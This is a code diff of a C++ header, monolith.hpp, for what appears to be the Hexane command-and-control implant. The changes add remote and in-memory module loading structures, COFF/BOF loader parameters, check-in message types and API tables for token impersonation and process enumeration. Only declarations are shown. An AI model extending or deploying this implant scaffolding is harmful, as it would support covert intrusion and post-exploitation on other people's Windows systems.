@@ -1,7 +1,6 @@
 #ifndef HEXANE_MONOLITH_HPP
 #define HEXANE_MONOLITH_HPP
 #include <core/ntimports.hpp>
-
 EXTERN_C
 ULONG
 	__instance;
@@ -28,7 +27,7 @@ LPVOID
 #define WIN_VERSION_2016_X      		11
 
 
-#define ntstatus 						Ctx->teb->LastErrorValue
+#define ntstatus 						ctx->teb->LastErrorValue
 #define GLOBAL_OFFSET					(U_PTR(InstStart()) + U_PTR( &__instance))
 #define HEXANE 							_hexane* ctx = (_hexane*) C_DREF(GLOBAL_OFFSET)
 
@@ -57,8 +56,8 @@ LPVOID
 
 #define PEB_POINTER64					((PPEB) __readgsqword(0x60))
 #define PEB_POINTER32					((PPEB) __readfsdword(0x30))
-#define REG_PEB32(Ctx) 					((LPVOID) (ULONG_PTR) Ctx.Ebx + 0x8)
-#define REG_PEB64(Ctx) 					((LPVOID) (ULONG_PTR) Ctx.Rdx + 0x10)
+#define REG_PEB32(thr) 					((LPVOID) (ULONG_PTR) thr.Ebx + 0x8)
+#define REG_PEB64(thr) 					((LPVOID) (ULONG_PTR) thr.Rdx + 0x10)
 
 #define SECTION_HEADER(data, i)   		((PIMAGE_SECTION_HEADER) B_PTR(data) + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * i))
 #define SYMBOL_TABLE(data, nt_head) 	RVA(_coff_symbol*, data, nt_head->FileHeader.PointerToSymbolTable)
@@ -75,9 +74,9 @@ LPVOID
 #define DH_KEY_SIZE						((uint32_t) 2048)
 #define AES_KEY_SIZE					((uint32_t) 16)
 
-#define Malloc(s)						Ctx->nt.RtlAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, s)
-#define Realloc(p, s) 	    			Ctx->nt.RtlReAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, p, s)
-#define Free(s) 			    		Ctx->nt.RtlFreeHeap(Ctx->heap, 0, s)
+#define Malloc(s)						ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, s)
+#define Realloc(p, s) 	    			ctx->memapi.RtlReAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, p, s)
+#define Free(s) 			    		ctx->memapi.RtlFreeHeap(ctx->heap, 0, s)
 
 #define x_assert(x)     				if (!(x)) goto defer
 #define x_assertb(x) 					if (!(x)) { success = false; goto defer; }
@@ -279,6 +278,12 @@ typedef NTSTATUS (NTAPI* NtContinue_t)(PCONTEXT ContextRecord, BOOLEAN TestAlert
 typedef NTSTATUS (NTAPI* NtAlertResumeThread_t)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
 typedef NTSTATUS (NTAPI* NtSignalAndWaitForSingleObject_t)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
 
+enum ModuleType {
+	LoadLocalFile	= 0x00000001,
+	LoadRemoteFile	= 0x00000002,
+	LoadMemory		= 0x00000003,
+	NoLink			= 0x00010000,
+};
 
 enum MessageType {
 	TypeCheckin    = 0x7FFFFFFF,
@@ -347,7 +352,7 @@ typedef struct _coff_params {
 	SIZE_T			data_size;
 	SIZE_T			args_size;
 	UINT32			task_id;
-	UINT32			coff_id;
+	UINT32			bof_id;
     BOOL			b_cache;
 	_coff_params	*next;
 }COFF_PARAMS, *PCOFF_PARAMS;
@@ -543,7 +548,30 @@ typedef struct _stream {
 	_stream  	*next;
 } STREAM, *PSTREAM;
 
-struct _secapi {
+typedef struct _load_module {
+	BOOL      	success;
+	PBYTE	  	buffer;
+	DWORD	  	length;
+	LPWSTR		local_name;
+	PWCHAR		cracked_name;
+	ULONG_PTR	base;
+	BOOL		linked;
+} LOADMODULE, *PLOADMODULE;
+
+typedef struct _ioapi {
+	DTYPE(FileTimeToSystemTime);
+	DTYPE(GetCurrentDirectoryA);
+	DTYPE(SystemTimeToTzSpecificLocalTime);
+	DTYPE(PathFindFileNameW);
+	DTYPE(CreateFileW);
+	DTYPE(FindFirstFileA);
+	DTYPE(FindNextFileA);
+	DTYPE(FindClose);
+	DTYPE(GetFileSize);
+	DTYPE(ReadFile);
+} ioapi;
+
+typedef struct _secapi {
 	DTYPE(LookupAccountSidW);
 	DTYPE(LookupPrivilegeValueA);
 	DTYPE(AddMandatoryAce);
@@ -598,10 +626,6 @@ typedef struct _procapi {
 	NtQueryInformationProcess_t NtQueryInformationProcess;
 		
 	DTYPE(GetProcessId);
-	DTYPE(Process32First);
-	DTYPE(Process32Next);
-    DTYPE(Module32First);
-    DTYPE(Module32Next);
 	DTYPE(ImpersonateLoggedOnUser);
 	DTYPE(AdjustTokenPrivileges);
 } procapi;
@@ -641,6 +665,10 @@ typedef struct _enumapi {
 	DTYPE(IsWow64Process);
 	DTYPE(GetUserNameA);
 	DTYPE(CreateToolhelp32Snapshot);
+	DTYPE(Process32First);
+	DTYPE(Process32Next);
+    DTYPE(Module32First);
+    DTYPE(Module32Next);
 	DTYPE(GetAdaptersInfo);
 	DTYPE(GetCurrentProcessId);
 	DTYPE(GlobalMemoryStatusEx);
@@ -679,7 +707,7 @@ typedef struct _apcapi {
 } apcapi;
 
 
-struct _utilapi {
+typedef struct _utilapi {
 	DTYPE(SleepEx);
 	DTYPE(CryptStringToBinaryA);
 	DTYPE(CryptBinaryToStringA);
@@ -718,6 +746,7 @@ struct _hexane {
 		HMODULE iphlpapi;
 		HMODULE mscoree;
 		HMODULE kernbase;
+		HMODULE shlwapi;
 	} modules;
 
 	struct {
@@ -754,12 +783,15 @@ struct _hexane {
 		BOOL	    	b_envproxy_check;
 	} network;
 
-#if defined(STAGER)
+	ioapi ioapi;
 	memapi memapi;
+	netapi netapi;
 	enumapi enumapi;
-#elif defined(PAYLOAD)
-#endif
-
+	secapi secapi;
+	apcapi apcapi;
+	procapi procapi;
+	threadapi threadapi;
+	utilapi utilapi;
 };
 
 #endif
